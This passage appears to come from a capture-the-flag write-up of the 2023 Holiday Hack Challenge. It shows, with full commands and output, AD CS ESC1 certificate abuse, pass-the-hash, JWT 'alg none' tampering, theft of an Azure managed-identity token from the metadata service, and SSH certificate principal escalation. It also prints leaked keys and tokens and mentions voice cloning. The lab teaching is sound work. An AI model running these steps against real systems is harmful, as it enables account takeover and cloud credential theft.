elfy (1104)/LogonCount: 2
elfy (1104)/PasswordLastSet: 2023-12-29 01:13:03.374053
elfy (1104)/PasswordDoesNotExpire: True
elfy (1104)/AccountIsDisabled: False
elfy (1104)/ScriptPath:
wombleycube (1105)/FullName:
wombleycube (1105)/UserComment:
wombleycube (1105)/PrimaryGroupId: 513
wombleycube (1105)/BadPasswordCount: 0
wombleycube (1105)/LogonCount: 56
wombleycube (1105)/PasswordLastSet: 2023-12-29 01:13:03.467812
wombleycube (1105)/PasswordDoesNotExpire: True
wombleycube (1105)/AccountIsDisabled: False
wombleycube (1105)/ScriptPath:
[*] Received 5 entries.
```

The Domain Controller has AD CS (Certificate Services) installed and is acting as a Certificate Authority. `Certipy` was used to enumerate installed certificate templates and CAs on the Domain Controller as `elfy`.

```bash
~$ ./certipy find -dc-ip '10.0.0.53' -u 'elfy@northpole.local' -p 'J4`ufC49/J4766' -debug -json -output ../ca-enum -vulnerable -enabled
```
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Authenticating to LDAP server
[+] Bound to ldaps://10.0.0.53:636 - ssl
[+] Default path: DC=northpole,DC=local
[+] Configuration path: CN=Configuration,DC=northpole,DC=local
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     NORTHPOLE.LOCAL\Domain Computers (S-1-5-21-1387884557-1616550563-3537715981-515)
     NORTHPOLE.LOCAL\Everyone (NORTHPOLE.LOCAL-S-1-1-0)
     NORTHPOLE.LOCAL\elfy (S-1-5-21-1387884557-1616550563-3537715981-1104)
     NORTHPOLE.LOCAL\Authenticated Users (NORTHPOLE.LOCAL-S-1-5-11)
     NORTHPOLE.LOCAL\Users (NORTHPOLE.LOCAL-S-1-5-32-545)
     NORTHPOLE.LOCAL\Domain Users (S-1-5-21-1387884557-1616550563-3537715981-513)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'npdc01.northpole.local' at '10.0.0.53'
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.0.0.53
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[+] Connected to remote registry at 'npdc01.northpole.local' (10.0.0.53)
[*] Got CA configuration for 'northpole-npdc01-CA'
[+] Resolved 'npdc01.northpole.local' from cache: 10.0.0.53
[+] Connecting to 10.0.0.53:80
[*] Saved JSON output to '../ca-enum_Certipy.json'
```

```bash
~$ cat ../ca-enum_Certipy.json | jq
```
```json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "northpole-npdc01-CA",
      "DNS Name": "npdc01.northpole.local",
      "Certificate Subject": "CN=northpole-npdc01-CA, DC=northpole, DC=local",
      "Certificate Serial Number": "40DBECFD7C2727A54B5BBC428957ECB7",
      "Certificate Validity Start": "2023-12-29 01:05:45+00:00",
      "Certificate Validity End": "2028-12-29 01:15:45+00:00",
      "Web Enrollment": "Disabled",
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Permissions": {
        "Owner": "NORTHPOLE.LOCAL\\Administrators",
        "Access Rights": {
          "2": [
            "NORTHPOLE.LOCAL\\Administrators",
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "1": [
            "NORTHPOLE.LOCAL\\Administrators",
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "512": [
            "NORTHPOLE.LOCAL\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "NorthPoleUsers",
      "Display Name": "NorthPoleUsers",
      "Certificate Authorities": [
        "northpole-npdc01-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        "EnrolleeSuppliesSubject"
      ],
      "Enrollment Flag": [
        "PublishToDs",
        "IncludeSymmetricAlgorithms"
      ],
      "Private Key Flag": [
        "ExportableKey"
      ],
      "Extended Key Usage": [
        "Encrypting File System",
        "Secure Email",
        "Client Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Domain Users",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "NORTHPOLE.LOCAL\\Enterprise Admins",
          "Write Owner Principals": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "Write Property Principals": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
      }
    }
  }
```

The Certificate Template `NorthPoleUsers` is enabled and allows client authentication. The template configuration is also reported as being vulnerable to the `ESC1` vulnerability ([which can be explained here](https://www.crowdstrike.com/resources/white-papers/investigating-active-directory-certificate-services-abuse-esc1/)) under `[!] Vulnerabilities`.
- **ESC1**: Low-privileged domain users can enroll and supply an arbitrary certificate subject name, effectively creating certificates on behalf of any domain object, including users.

A certificate can be requested by specifying the UPN `alabaster@northpole.local` with `Certipy` as the `elfy` user with only providing the CA name, template name, and the aforementioned subject.

```bash
~$ ./certipy req -ca 'northpole-npdc01-CA' -template 'NorthPoleUsers' -upn 'wombleycube@northpole.local' -dc-ip '10.0.0.53' -target 'npdc01.northpole.local' -u 'elfy@northpole.local' -p 'J4`ufC49/J4766'
```
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 107
[*] Got certificate with UPN 'wombleycube@northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'womblcycube.pfx'
```

A detailed view of the generated X.509 certificate (note the subject):

```bash
~$ openssl x509 -in wombleycube.pfx -noout -text
```
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            30:00:00:00:6b:35:d5:b5:55:e4:18:f3:42:00:00:00:00:00:6b
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC = local, DC = northpole, CN = northpole-npdc01-CA
        Validity
            Not Before: Dec 29 12:44:04 2023 GMT
            Not After : Dec 28 12:44:04 2024 GMT
        Subject: CN = Elfy
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:cd:bc:39:ef:b4:b5:a1:b5:1b:b4:e9:62:5f:e3:
                    e0:3d:dc:b7:33:42:5e:71:5a:44:f2:3d:bf:4b:f7:
                    5c:5c:06:9e:8b:5a:ee:7e:3a:4d:fd:7d:5a:ff:e4:
                    f9:86:58:16:b5:9f:79:00:fa:6a:c2:69:a5:3f:f9:
                    5d:53:19:7e:24:0f:b4:98:dd:50:b3:a1:1b:e6:21:
                    5d:75:cd:18:b2:22:5a:80:24:69:f7:48:95:08:9d:
                    41:2a:81:d0:05:4c:0e:d5:a2:65:d2:6c:47:67:8e:
                    e1:3a:69:f7:df:6b:41:b4:b3:6e:a0:af:03:a3:cc:
                    9d:c9:d9:30:cd:21:b8:48:5a:70:c9:97:85:90:7d:
                    3b:e3:ff:34:71:f2:bf:15:2f:a6:92:a8:91:31:50:
                    22:86:7d:3b:9b:ec:71:47:a7:69:3f:75:dc:44:05:
                    6a:52:41:a5:c3:fa:c2:9b:2b:b3:6b:97:1e:b3:00:
                    ca:d3:14:45:64:80:85:4b:77:48:21:28:ff:11:8d:
                    49:51:15:9f:a7:7d:dc:a1:93:cc:e4:8c:df:14:81:
                    b2:9e:ba:6e:0c:79:0f:93:c0:f4:d5:25:70:12:87:
                    77:f2:14:ce:67:db:b7:b0:f9:a3:14:4c:e5:93:86:
                    09:b0:05:d9:ef:21:5c:30:f8:de:ff:d4:9a:76:22:
                    f8:77
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Alternative Name:
                othername: UPN::wombleycube@northpole.local
            X509v3 Subject Key Identifier:
                2A:8E:C1:0C:1F:61:2F:AB:FB:1A:60:09:F6:3B:88:16:7D:0A:2B:51
            X509v3 Authority Key Identifier:
                77:32:E6:FD:E4:23:B4:B3:91:C6:EC:E1:90:23:03:E5:A4:D8:6A:2F
            X509v3 CRL Distribution Points:
                Full Name:
                  URI:ldap:///CN=northpole-npdc01-CA,CN=npdc01,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=northpole,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint
            Authority Information Access:
                CA Issuers - URI:ldap:///CN=northpole-npdc01-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=northpole,DC=local?cACertificate?base?objectClass=certificationAuthority
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            1.3.6.1.4.1.311.21.7:
                0/.'+.....7.....\...{.......=.....q.......?..d...
            X509v3 Extended Key Usage:
                Microsoft Encrypted File System, E-mail Protection, TLS Web Client Authentication
            1.3.6.1.4.1.311.21.10:
                0&0..
+.....7
..0
..+.......0
..+.......
            S/MIME Capabilities:
......0...+....0050...*.H..
..*.H..
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        12:e6:5f:80:eb:bc:df:a7:4f:91:b1:87:07:b4:25:c1:c1:ce:
        23:e4:8b:bd:33:cc:4d:10:8b:de:92:50:cc:ab:11:57:a8:0b:
        3c:c3:43:33:cd:78:10:1b:79:52:2a:35:18:8a:0d:36:72:d0:
        d2:66:9e:5d:2b:66:5d:b5:05:dd:bf:52:fb:c3:51:b9:b5:94:
        b9:d6:46:70:ea:c8:d7:e8:0f:5a:e6:20:83:2f:58:09:37:5f:
        28:f3:f0:e6:79:4b:28:a3:22:c7:49:3a:94:9a:7e:a9:eb:83:
        4b:da:2a:90:7c:0f:d7:e6:6b:b8:f5:3e:51:69:ef:dc:28:e3:
        5c:92:32:2e:2e:93:c0:5a:87:56:20:5d:df:14:cb:16:05:5b:
        b7:2e:19:a3:56:38:a0:d2:a7:a6:81:b7:a3:0e:53:94:54:91:
        24:f0:17:c7:b8:5e:27:46:36:8a:56:3b:b3:31:57:90:8b:62:
        e8:c9:7a:b3:c3:bb:ec:63:af:8c:21:3f:d5:c3:4d:31:ae:89:
        31:50:60:98:1a:46:43:d2:68:59:43:40:d5:67:a9:fa:97:7e:
        ec:a6:16:09:5e:22:80:70:9a:83:c9:91:fe:ba:5e:b9:b1:34:
        42:bb:15:58:6b:c9:03:0f:1d:28:26:a3:3c:b8:04:4d:95:d6:
        d4:2b:22:73
No Trusted Uses.
No Rejected Uses.
Alias:
Key Id: 03:EA:4A:67:E6:F5:E2:29:34:59:36:2B:BC:90:1C:54:FE:DB:75:F5
```

This certificate can then be used to authenticate as the `wombleycube` user and obtain a Kerberos ticket granting ticket (TGT) of the account in the `subject` field using `Certipy` and the `auth` submodule.

```bash
~$ ./certipy auth -pfx wombleycube.pfx -ptt -print -kirbi -debug -dc-ip '10.0.0.53' -domain 'northpole.local'
```
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'wombleycube.kirbi'
[*] Trying to inject ticket into session
[-] Not running on Windows platform. Aborting
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

![Pasted image 20231229045512.png](Pasted%20image%2020231229045512.png)

This TGT issued by the Kerberos authentication service (AS) can be sent back to the KDC ticket granting service (TGS) in a **Pass the Ticket** attack to then be issued the service ticket to authentication as a user.

There's also a NT:LM hash dumped for `wombleycube@northpole.local`, which cann be passed in a **Pass the Hash** attack.
whoami /groups
```bash
~$ ./smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 'northpole.local/wombleycube@10.0.0.53'
```
```
# use FileShare
# cd super_secret_folder
# ls
drw-rw-rw-          0  Fri Dec 29 01:13:59 2023 .
drw-rw-rw-          0  Fri Dec 29 01:13:59 2023 ..
-rw-rw-rw-        231  Fri Dec 29 01:13:59 2023 InstructionsForEnteringSatelliteGroundStation.txt
```

Now that the attack was executed to obtain access to the shares, privileges have been escalated to the user specified in the subject field within the certificate.

The super secret file name is `InstructionsForEnteringSatelliteGroundStation.txt`.

## Pixel Island

### Raincaster Cliffs

#### Elf Hunt

Piney Sappington needs help manipulating JWTs on an Elf Hunt game.

The game pulls a cookie `ElfHunt_JWT` on startup that contains two base64-encoded "stringified" JSON arrays separated by a plaintext `.`:

Part 1
```json
{"alg":"none","typ":"JWT"}
```

Part 2
```json
{"speed": -500}
```

Changing the JSON value to `speed: 100` and re-encoding it to match the cookie's format makes it much easier to shoot down the elves. At 75 points the game presents us with a victory and _The Captain's Journal_.

![Pasted image 20231210151546.png](Pasted%20image%2020231210151546.png)

We can now speak to Chimney Scissorsticks as the Brass Buoy Port on Steampunk island.

#### Certificate SSHenanigans

![Pasted image 20231209194916.png](Pasted%20image%2020231209194916.png)

> _Difficulty:_ 🎄🎄🎄🎄🎄
> Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure [Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl). What type of cookie cache is Alabaster planning to implement?

**Alabaster Snowball** wants help securing his new Azure server at `ssh-server-vm.santaworkshopgeeseislands.org`, saying that ChatNPT suggested him to setup the server to use SSH certificates. He also mentions using an Azure Function App so elves can request their own certificates.

He gives a set of instructions.
1. Generate a SSH certificate.
2. Use the `monitor` account to access the host.
3. Grab his TODO list.

> Watch [Certifiably Secure & Slightly Shell-arious. A Whimsical Intro to Secure Shell Certificates](https://youtu.be/4S0Rniyidt4) by Thomas Bouvre and read up on a handy Azure API endpoint [get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control) detailing how the Function App is deployed.

The [Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) allowing elves the ability to request SSH certificates looks like so:

![Pasted image 20231209195502.png](Pasted%20image%2020231209195502.png)

We have to generate a keypair on our own system using `ssh-keygen`, then upload the public key to the Function App to obtain our certificate.

Evidently, our certificate was signed with the princpal `elf`.
```
sshenanigans.crt:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:bskQLe+lKL3G78OksFFjpEasEftqAaG2/tmMxPnI2tY
        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)
        Key ID: "e9166fde-f524-4805-a9b0-d165ba533f13"
        Serial: 1
        Valid: from 2023-12-09T19:53:22 to 2024-01-06T19:58:22
        Principals:
                elf
        Critical Options: (none)
        Extensions:
                permit-pty
```

Using this certificate signed by the server's CA, and my private key, I'm able to login to login to `monitor@ssh-server-vm.santaworkshopgeeseislands.org`.

`~# ssh -i ./sshenanigans.crt -i ./sshenanigans_rsa monitor@ssh-server-vm.santaworkshopgeeseislands.org`

![Pasted image 20231211231801.png](Pasted%20image%2020231211231801.png)

Pressing `CTRL+C` exited this `/usr/local/bin/sattrackr` program and gave me a normal `bash` shell.

- The system is running Debian Linux 12 (bookworm) on kernel 6.1.0-13-cloud-amd64 (Azure VM).
    - `uname -a`
    - `cat /etc/*release`
- The only 2 normal users on the system are `alabaster` and `monitor`, and `sshallow` group.
    - `cat /etc/passwd`
    - `cat /etc/group`
- User `alabaster` has the `admin` auth principal
    - `ls /etc/ssh/auth_principals`
- There are 9 binaries with the SUID bit, one of which is non-default but disabled.
    - `find / -type f -executable -perm -4000 2>/dev/null`
- No interesting cron jobs.
    - `cat /etc/crontab && ls -l /etc/cron*`

```
-rwsr-xr-x 1 root root 72000 Mar 23  2023 /usr/bin/su
-rwsr-xr-x 1 root root 48896 Mar 23  2023 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59704 Mar 23  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 68248 Mar 23  2023 /usr/bin/passwd
-rwsr-xr-x 1 root root 52880 Mar 23  2023 /usr/bin/chsh
-rwsr-xr-x 1 root root 62672 Mar 23  2023 /usr/bin/chfn
-rwsr-xr-x 1 root root 88496 Mar 23  2023 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35128 Mar 23  2023 /usr/bin/umount
-rwsr-xr-x 1 root root 653888 Sep 23 22:11 /usr/lib/openssh/ssh-keysign
```

https://gist.github.com/hardcidr/27026512d803f0b13362216e977a26ba

![Pasted image 20231221232313.png](Pasted%20image%2020231221232313.png)

```bash
AUTH="$(curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | jq -r .access_token)"
```

Making this request from within the Azure VM responds with an access token to access other Azure resources with.

> [How managed identities work](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-managed-identities-work-vm)

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI1MTMyMDQsIm5iZiI6MTcwMjUxMzIwNCwiZXhwIjoxNzAyNTk5OTA0LCJhaW8iOiJFMlZnWURBSk4vSzlVcEtlbXMwNDR3RFAyWlJwQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiIwbV9zY0l2bmlVR1hlTGhyemkwYUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.ZNvXauUmocVHKqh6HJ2DbmYMEu8NcUB8s8o2Ky4sEZkqb-0L7yvAsH3oXl3nyhPZZS0-R5phIYKsMHhoi6tOcwBK0ypOe0lUsjfhPv0cPeIJxPaijLhyL3Ba8hblf_6_9lcusIFv9gGWIh_N67pcs9SnikHKR27DWC5NWwE-WCFhuHRh4Ju6C0fRrgA2Fe0XKcD-iAdKWmRr1JwXqXT4RdQAIWR6-04HNsf_oSK9fzolRz_Tu53ccVYOsR_HF0M8abEoeB7WZ8zVur-uEkb4HNa2RSi7KEW4Z0RuGlAKtIHI0l0s5Dug0nHOvOQrkSfCtvhQrpKT6jAHF4Ly-DHsYQ",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "86016",
  "expires_on": "1702599904",
  "ext_expires_in": "86399",
  "not_before": "1702513204",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

With that token, the `get-source-control` API endpoint can be used to grab the source control configuration of the function app.

```
~$ curl -H "Authorization: Bearer $AUTH" 'https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01'
```

```json
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
  "name": "northpole-ssh-certs-fa",
  "type": "Microsoft.Web/sites/sourcecontrols",
  "location": "East US",
  "tags": {
    "project": "northpole-ssh-certs",
    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
  },
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    "branch": "main",
    "isManualIntegration": false,
    "isGitHubAction": true,
    "deploymentRollbackEnabled": false,
    "isMercurial": false,
    "provisioningState": "Succeeded",
    "gitHubActionConfiguration": {
      "codeConfiguration": null,
      "containerConfiguration": null,
      "isLinux": true,
      "generateWorkflowFile": true,
      "workflowSettings": {
        "appType": "functionapp",
        "publishType": "code",
        "os": "linux",
        "variables": {
          "runtimeVersion": "3.11"
        },
        "runtimeStack": "python",
        "workflowApiVersion": "2020-12-01",
        "useCanaryFusionServer": false,
        "authType": "publishprofile"
      }
    }
  }
}
```

The [Github repo URL](https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa) is listed as the source control repository.

Analyzing the code in `function_app.py`, the function `parse_input(data)` reads the `principal` key from the JSON data and later creates the certificate with that principal, defaulting to "elf" if no principal key exists.

This means that when a user requests a certificate when providing their public key, the request can be modified to include a `principal` key with the value `admin`. Since the `alabaster` user on the system is assigned the `admin` principal, this will enable a certificate generated with that principal to authenticate with `alabaster` instead.

The request can be intercepted and modified in Burp.

![Pasted image 20231213165637.png](Pasted%20image%2020231213165637.png)

The certificate successfully generated and provided it in the response body. This is actually the same vulnerability mentioned in the Reportinator challenge's pentest report.

![Pasted image 20231213165714.png](Pasted%20image%2020231213165714.png)

And double-checking with `ssh-keygen` vertifies that the principal is in fact `admin`.

![Pasted image 20231213165813.png](Pasted%20image%2020231213165813.png)

And SSH authentication works!

![Pasted image 20231213165930.png](Pasted%20image%2020231213165930.png)

Alabaster's TODO list is named `alabaster_todo.md` under the home dir.

```
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.

```

Alabaster is planning to implement the **Gingerbread Cookie Cache**.

Impacket is also on the system under Alabaster's home directory.


## Space Island

### Spaceport Point

#### Access Door Speaker

Jewel Loggins needs access behind a door that only Wombley Cube knows the password to. He says that Wombley Cube uses a form of multifactor authentication in addition to using a passphrase passed by voice.

Attempting to open the doors prompts a file upload dialog for an audio file.

Now, Wombley Cube showed us a podcast earlier. This was a 5 minute recording of his voice that could be an excellent sample for a voice cloning attack paired with text-to-speech to generate a sample of the passphrase being read out in Wombley's voice.

//TODO

### Cape Cosmic Inside Fence / Zenith SGS

#### Camera Access

Wombley Cube can be found inside the Zenith Sattelite Ground Station, surprised to see that I bypassed MFA. But he says there's no chance we can hack the satellite itself.

> The nanosat's Supervisor Directory will remain hidden, and you'll never discover the mastermind behind all this.

In his hubris, Wombley revealed that he thinks I won't be able to access the satellite's "Supervisor Directory". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.

Beside the satellite control panel is a _Ground station client vending machine_, [dispensing Nanosat clients](https://www.holidayhackchallenge.com/2023/client_container.zip).

Extracting the `client_container.zip` creates a build script for a Dockerfile and an assets directory.

Analyzing the Dockerfile, the container is based on `eclipse-temurin:11-jre` and the following packages are installed:

```
fluxbox
net-tools
novnc
socat
x11vnc
tcpdump
wireshark
vim
nano
wireguard-tools
iproute2
gedit
xvfb
```

Running the buildscript builds and runs the container and exposes the services:

| Service   | Port |
| --------- | ---- |
| Websocket | `6901` |
| VNC       | `5900` |

After a VNC connection is established, the container can be seen running Fluxbox (minimal and lightweight X window manager).

![Pasted image 20231231154415.png](Pasted%20image%2020231231154415.png)

There is also *NanoSat MO Base Station Tool* installed, which opens a tool called _CTT: Consumer Test Tool_.

![Pasted image 20231231154533.png](Pasted%20image%2020231231154533.png)

![Pasted image 20231231154546.png](Pasted%20image%2020231231154546.png)

On the other hand, the satellite control panel in the ground station opens a webpage at https://nanosat.one/ titled "Nanosat Christmas Comms".

![Pasted image 20231231160955.png](Pasted%20image%2020231231160955.png)

There's also a button in the bottom-right corner of the page shaped like an alligator head. Clicking it opens a dialog with what looks like a terminal for _GateXOR_ (pronounded *gate-or*). There are buttons for About, Time Travel, and Collapse.

> **GateXOR** is a magical **time** **shifting** alligator. For certain challenges GateXOR empowers the adventurer to perform point-in-time **Travel** or **Collapse** the specific timeline of the challenge, in order to start the challenge from the beginning.

> Be warned! While GateXOR tries to help as many concurrent players as possible, this reptile only has so much juice in the tank. If running low on **time-energy**, GateXOR will let you know that a rest is required and that you'll have to take a short break.

> P.S. The magical modern dino is here to help and is **not to be hacked**! In fact if you find a bug, DM Santa's team about it in the [Discord](https://discord.gg/eqKjjsNdHV) channel!

Clicking Time Travel, the output is displayed:

```
GateXOR> {start} [timeline] unstable...
GateXOR> {11} total [timelines] are within tolerance...
GateXOR> tearing down [timeline]...
GateXOR> tearing down [timeline] complete...
GateXOR> building [timeline]...
GateXOR> [kronos storage] has been created...
GateXOR> waiting for [timeline] to be created...
GateXOR> [timeline] has been created...
GateXOR> building up finished...
GateXOR> connecting [time traveler] try {1} of {50}...
GateXOR> [time traveler] connected successfully...
GateXOR> [time traveler] please hold, configuring...

###BEGIN### ### This is the server's Wireguard configuration file. Please consider saving it for your record. ###

[Interface]
Address = 10.1.1.1/24
PrivateKey = Yxve5KVNMYK7daGbYVwHgR+cXmiRxeoPPL7837QRek0=
ListenPort = 51820

[Peer]
PublicKey = NyT7WS/KFFq1ROBYSSgns98ddYyZGKoAHBptIjvGwSg=
AllowedIPs = 10.1.1.2/32

###END####

###BEGIN### ### This is your Wireguard configuration file. Please save it, configure a local Wireguard client, and connect to the Target. ###

[Interface]
Address = 10.1.1.2/24
PrivateKey = T5QGVQV2rtlZY5CDJ/0h4O0KIX1u2pIwDSE5xUs/M0s=
ListenPort = 51820

[Peer]
PublicKey = 7CfLESPekUahkMb/UJGbpXGqz3HTq87ncv0/Xms6tiY=
Endpoint = 34.133.78.240:51820
AllowedIPs = 10.1.1.1/32

###END####

GateXOR> {end}...[timeline] reverted!
```

Evidently, that created a Wireguard client configuration file for VPN access and also dumped the server's private key.

The ground station client container has `wireguard-tools` package installed which provides `wg` and `wg-quick` which will be used to establish the tunnel.

```bash
~$ wg-quick up ./wgclient.conf
```
```
[#] ip link add wgclient type wireguard
[#] wg setconf wgclient /dev/fd/63
[#] ip -4 address add 10.1.1.2/24 dev wgclient
[#] ip link set mtu 1420 up dev wgclient
```

The tunnel is established. A TCP CONNECT port scan with version fingerprinting ran against the gateway at 10.1.1.1 revealed that port 22 is open and 5901 and 6901 are both filtered.

```bash
~$ nmap 10.1.1.1/24 -sC -sV --send-ip -n -T5 --top-ports 1000
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 20:36 EST
Nmap scan report for 10.1.1.2
Host is up (0.00042s latency).
